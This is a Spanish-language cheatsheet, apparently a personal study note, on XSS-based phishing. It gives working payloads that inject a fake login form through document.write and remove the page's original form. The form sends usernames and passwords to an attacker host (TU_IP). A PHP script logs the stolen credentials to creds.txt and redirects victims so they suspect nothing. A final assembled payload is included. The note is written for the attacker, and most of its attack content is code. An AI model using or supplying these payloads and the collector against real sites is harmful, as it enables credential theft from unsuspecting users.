---
aliases:
tags:
  - type/cheatsheet
  - vuln/xss
  - technique/execution
  - asset/web-app
  - estado/incompleto
primary categories:
secondary categories:
tertiary categories:
linked:
---

## Phishing con XSS — Explicación Clara y Directa

Un ataque de phishing usando XSS consiste en **inyectar código HTML/JS en una página confiable**, para que el usuario:

1. **Vea un formulario falso**
2. **Ingrese sus credenciales creyendo que es legítimo**
3. **Las credenciales se envíen a tu servidor**
4. **Vos las registres y luego redirijas al usuario a la página original (para evitar sospechas)**

---

## 1. Descubrimiento del XSS

La web tiene un campo donde ponés un **URL de imagen**.
Intentás:

```html
"><script>alert(1)</script>
```

Pero no funciona → muestra solo un *icono de imagen rota*.

Entonces inspeccionás **cómo se refleja tu input en el HTML**.
De ahí deducís **qué contexto XSS podés ejecutar**:

* Dentro de un atributo → `onerror`
* Dentro de un `<script>` → JS directo
* Dentro de HTML → cerrar etiquetas, etc.

Ejemplo típico:

```html
<img src=X onerror=alert(1)>
```

Si eso funciona, ya tenés tu vector.

---

## 2. Inyectar el formulario de phishing

Querés mostrar un formulario que envíe credenciales a tu IP.

HTML básico:

```html
<h3>Please login to continue</h3>
<form action=http://TU_IP>
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```

Como esto lo tenés que **inyectar vía JavaScript**, lo metés dentro de `document.write()`:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://TU_IP><input type="text" name="username"><input type="password" name="password"><input type="submit"></form>');
```

![[Phishing XSS-1.png]]

---

## 3. Ocultar el formulario original

Todavía se ve el campo original para ingresar una imagen.
Eso rompe tu engaño.

Inspeccionás el código → el formulario original tiene:

```html
<form id="urlform">
```

Entonces lo eliminás:

```javascript
document.getElementById('urlform').remove();
```

Ahora unís todo:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

![[Phishing XSS-2.png]]

---

## 4. Ocultar el resto del HTML => Comentario HTML

Todavía queda basura del HTML original.
Solución simple: abrís un comentario para “romper” el resto del documento.

```html
<!--
```

Lo ponés al final del payload:

```
...PAYLOAD... <!--
```

---

## 5. Preparar el servidor para capturar credenciales

### Opción fácil: `nc`

```bash
sudo nc -lvnp 80
```

Pero el usuario ve un error *“Unable to connect”*, muy sospechoso.

---

## 6. Opción real: un servidor PHP que captura credenciales y redirige

Creás `index.php`:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Lo servís así:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
php -S 0.0.0.0:80
```

Ahora cualquier víctima:

1. Ingresa datos
2. El servidor **recibe las credenciales**
3. Guarda en **creds.txt**
4. Redirige al sitio original
   → para que piense que fue un login exitoso

---

## 7. Resultado final

* El usuario mira la página → ve un formulario legítimo
* Ingresa su usuario/clave
* La página los manda a tu PHP
* Vos registrás → `Username: test | Password: test`
* El usuario vuelve al sitio original sin sospechas

---

## Payload final (ejemplo simplificado)

```html
"><script>
document.write('<h3>Please login to continue</h3><form action=http://TU_IP><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
document.getElementById("urlform").remove();
</script><!--
```

---